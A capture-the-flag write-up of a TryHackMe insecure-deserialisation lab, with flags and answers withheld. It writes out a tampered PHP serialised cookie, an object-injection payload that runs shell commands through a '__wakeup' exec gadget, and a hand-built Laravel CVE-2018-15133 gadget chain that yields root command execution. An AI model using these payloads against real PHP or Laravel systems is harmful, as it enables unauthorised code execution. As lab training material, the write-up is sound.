# Insecure Deserialisation (TryHackMe)

Room: Insecure Deserialisation — Web Application Pentesting / Advanced Server-Side Attacks. PHP
`unserialize()` property-tampering and object injection (RCE), plus a Python pickle demo and a
Laravel CVE-2018-15133 `X-XSRF-TOKEN` deserialisation RCE via PHPGGC. Completed: 2026-11-09 | Target:
<ip> (`insecure_deserialisationv1.37-badr`). Solved **fully headless from `C:\CTF`** with
`curl` + Python stdlib — no browser, no AttackBox, no PHPGGC install (gadget hand-crafted).

## Answers

| Task | Question | Answer |
|---|---|---|
| 2 | PHP serialisation function | *(find it yourself)* |
| 2 | CVE-2015-4852 base score | *(find it yourself)* |
| 2 | Serialisation only to a byte-stream file? | *(find it yourself)* |
| 3 | Base64 pickle of `You got it` | *(find it yourself)* |
| 3 | PHP serialise of `You got it` | *(find it yourself)* |
| 3 | Ruby binary serialisation module | *(find it yourself)* |
| 4 | User-defined serialisation function (`/who/`) | *(find it yourself)* |
| 5 | Flag after sharing with a valid subscription | `THM{…}` |
| 5 | Default role on load | *(find it yourself)* |
| 6 | Flag after the reverse shell | `THM{…}` |
| 6 | `whoami` after the shell | *(find it yourself)* |
| 7 | PHPGGC vector for `CodeIgniter4/FR1` | *(find it yourself)* |
| 7 | `whoami` on the Laravel app | *(find it yourself)* |
| 7 | `uname -r` on the Laravel app | *(find it yourself)* |
| 8 | Blindly use `eval()`? | *(find it yourself)* |

Services: `:80` (phptest, `/who/`, `/case1`, `/case2`), `:5000` (Python pickle app), `:8089`
(Laravel 5.6.29).

## Task 3 — serialise `You got it`

- **PHP** (`/phptest/` → `POST save_notes.php note=You got it`):
  `O:5:"Notes":1:{s:7:"content";s:10:"You got it";}`.
- **Python** (`:5000` → `POST note_content=You got it&pickle=`): b64 pickle above.

## Task 4 — backup-file source disclosure

`/who/index.php` only echoes `O:4:"Test":2:{...}`. The task hints at the editor `~` backup trick:
`GET /who/index.php~` returns the **source**, revealing the user-defined wrapper:

```php
function HelloTHMSerialization($obj) { return serialize($obj); }
```

## Task 5 — property tampering (`/case1`)

First visit sets a base64url cookie `user_data`:

```
O:5:"Notes":3:{s:4:"user";s:5:"guest";s:4:"role";s:5:"guest";s:12:"isSubscribed";b:0;}
```

Flip `isSubscribed";b:0` → `b:1`, re-encode, and POST the share request (JSON key is `shareNote`,
discovered in the page JS):

```bash
# cookie = base64url(...b:1...)
POST /case1/note_share.php  {"shareNote":"Welcome to the club"}
-> {"isSubscribed":true,"flagValue":"THM{…}"}
```

## Task 6 — object injection → RCE (`/case2`)

`/case2/?decode=<b64>` base64-decodes then `unserialize()`s with no validation. `/case2/test.php`
leaks the gadget class (`MaliciousUserData` with `public $command` and `__wakeup(){ exec($command); }`).
Craft an object whose `command` is my own; `__wakeup` fires on deserialisation:

```php
O:17:"MaliciousUserData":1:{s:7:"command";s:<len>:"<cmd>";}
```

`exec()` returns no page output, so I redirect command output to a web-readable file and GET it:

```
command = id > /var/www/html/case2/o.txt 2>&1; whoami >> ...   # -> www-data
command = cat /var/www/html/case2/flag.php > /var/www/html/case2/o.txt
GET /case2/o.txt -> $flag = "THM{…}";
```

Flag file found with `find / -iname '*flag*'` → `/var/www/html/case2/flag.php`.

## Task 7 — Laravel CVE-2018-15133 (`:8089`, PHPGGC `Laravel/RCE3`)

Laravel 5.6.29 decrypts+`unserialize`s the `X-XSRF-TOKEN` using `APP_KEY`. The room hands over both
tooling steps: `/get-key` gives the `APP_KEY` + a sample RCE3 payload, and
`/cve.php?app_key=&payload=` encrypts a chosen PHPGGC payload into a valid token.

No PHPGGC install needed — the `Laravel/RCE3` gadget is a fixed shape; swap the command in the
protected `*app` property (null bytes `\x00*\x00`), `customCreators` maps to `system`:

```
O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"\0*\0events";
 O:39:"Illuminate\Notifications\ChannelManager":3:{
  s:6:"\0*\0app";s:<len>:"<cmd>";
  s:17:"\0*\0defaultChannel";s:1:"x";
  s:17:"\0*\0customCreators";a:1:{s:1:"x";s:6:"system";}}}
```

Flow per command: base64 the gadget → `GET /cve.php?app_key=<KEY>&payload=<b64>` → encrypted token →
`POST / -H "X-XSRF-TOKEN: <token>"`; output appears at the start of the response.

```
whoami    -> root
uname -r  -> 5.15.0-1075-aws
```

(APP_KEY this run: `<redacted-secret>`.)

## Lessons

- **`~` backups are free source disclosure.** When a `.php` only shows output, try `file.php~` (and
  `.swp`, `.bak`) — here it handed over the exact function name the question asked for. (cf. the
  Injectics room, where source was *not* readable and that changed everything.)
- **Serialised cookies are client-controlled state.** A base64 PHP-serialised cookie with
  `isSubscribed;b:0` is a one-character tamper (`b:1`) away from the privileged branch — no signing,
  no HMAC, so the server trusts whatever deserialises.
- **Object injection = BYOO (bring your own object).** You can't change a magic method's code, but
  you fully control the *properties* it operates on. An `exec($this->command)` in `__wakeup` becomes
  arbitrary RCE by serialising the gadget class with your command. Read the included class
  (`test.php`, or its `~` backup) to get the exact class name/length (`O:17:"MaliciousUserData"`).
- **Blind-exec exfil.** `exec()`/`__destruct` RCE gives no page output; redirect to a file under the
  webroot (`> /var/www/html/.../o.txt 2>&1`) and GET it — the headless equivalent of a reverse shell.
- **Gadget chains don't require the tool.** PHPGGC automates it, but `Laravel/RCE3` is a static
  serialised string; hand-build it (mind the `\x00*\x00` protected-property markers and byte-accurate
  lengths) and let the room's `/cve.php` do the `APP_KEY` encryption. Same for the vector trivia:
  `CodeIgniter4/FR1` → `__toString`.
- **Headless pattern** (cf. [[injectics]], [[server-side-template-injection]], [[xxe-injection]]):
  `curl`/`http.client` for every stage — form posts, cookie tamper, `?decode=` object injection, and
  the encrypt→POST Laravel chain — all from `C:\CTF`. Oracle for blind RCE is a web-readable output
  file; for Laravel it's the command result at the top of the POST response.
